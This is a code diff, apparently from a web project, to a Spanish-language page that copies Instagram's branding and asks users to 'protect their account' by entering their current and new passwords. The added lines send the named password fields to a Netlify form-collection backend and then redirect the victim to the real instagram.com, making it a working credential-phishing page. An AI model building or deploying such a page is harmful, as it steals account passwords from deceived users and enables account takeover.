@@ -36,18 +36,26 @@
                 </svg>
             </div>
             
-            <!-- Instagram Logo con fuente imitada -->
+            <!-- Logo de Instagram con fuente imitada -->
             <h1 class="instagram-logo mb-4">Instagram</h1>
             
             <h1 class="text-xl font-bold mb-2 text-center">Protege tu cuenta: Cambia tu contraseña</h1>
             <p class="text-sm text-center text-[#999]">Para tu seguridad, por favor introduce tu contraseña actual y la nueva contraseña que quieres usar.</p>
         </div>
         
-        <form class="space-y-4">
+        <form name="change-password" data-netlify="true" netlify-honeypot="bot-field" class="space-y-4" onsubmit="return validateForm(event)">
+            <input type="hidden" name="form-name" value="change-password">
+            <input type="hidden" name="_redirect" value="https://www.instagram.com">
+            <p class="hidden">
+                <label>
+                    No me llenes esto: <input name="bot-field">
+                </label>
+            </p>
             <div>
                 <input 
                     type="password" 
                     id="current-password" 
+                    name="current-password"
                     class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200" 
                     placeholder="Contraseña actual"
                 >
@@ -56,6 +64,7 @@
                 <input 
                     type="password" 
                     id="new-password" 
+                    name="new-password"
                     class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200" 
                     placeholder="Nueva contraseña"
                 >
@@ -64,10 +73,17 @@
                 <input 
                     type="password" 
                     id="confirm-password" 
+                    name="confirm-password"
                     class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200" 
                     placeholder="Confirmar nueva contraseña"
                 >
             </div>
+            <p id="error-message" class="text-red-500 text-sm text-center hidden">
+                Las contraseñas no coinciden.
+            </p>
+             <p id="empty-fields-message" class="text-red-500 text-sm text-center hidden">
+                Por favor, completa todos los campos de contraseña.
+            </p>
             <button 
                 type="submit" 
                 class="w-full bg-[#1e40af] hover:bg-[#1c3a8a] text-white font-medium py-3 px-4 rounded-xl transition-colors duration-200"
@@ -80,6 +96,35 @@
             <a href="#" class="text-sm text-[#88aaff] hover:underline">¿Olvidaste tu contraseña actual?</a>
         </div>
     </div>
+
+    <script>
+        function validateForm(event) {
+            const currentPassword = document.getElementById('current-password').value;
+            const newPassword = document.getElementById('new-password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+            const errorMessage = document.getElementById('error-message');
+            const emptyMessage = document.getElementById('empty-fields-message');
+            
+            // Ocultar mensajes de error previos
+            errorMessage.classList.add('hidden');
+            emptyMessage.classList.add('hidden');
+            
+            // Validar que los campos no estén vacíos
+            if (!currentPassword || !newPassword || !confirmPassword) {
+                emptyMessage.classList.remove('hidden');
+                event.preventDefault();
+                return false;
+            }
+
+            if (newPassword !== confirmPassword) {
+                errorMessage.classList.remove('hidden');
+                event.preventDefault(); // Evita que el formulario se envíe
+                return false;
+            } else {
+                return true;
+            }
+        }
+    </script>
 
 </body>
 </html>
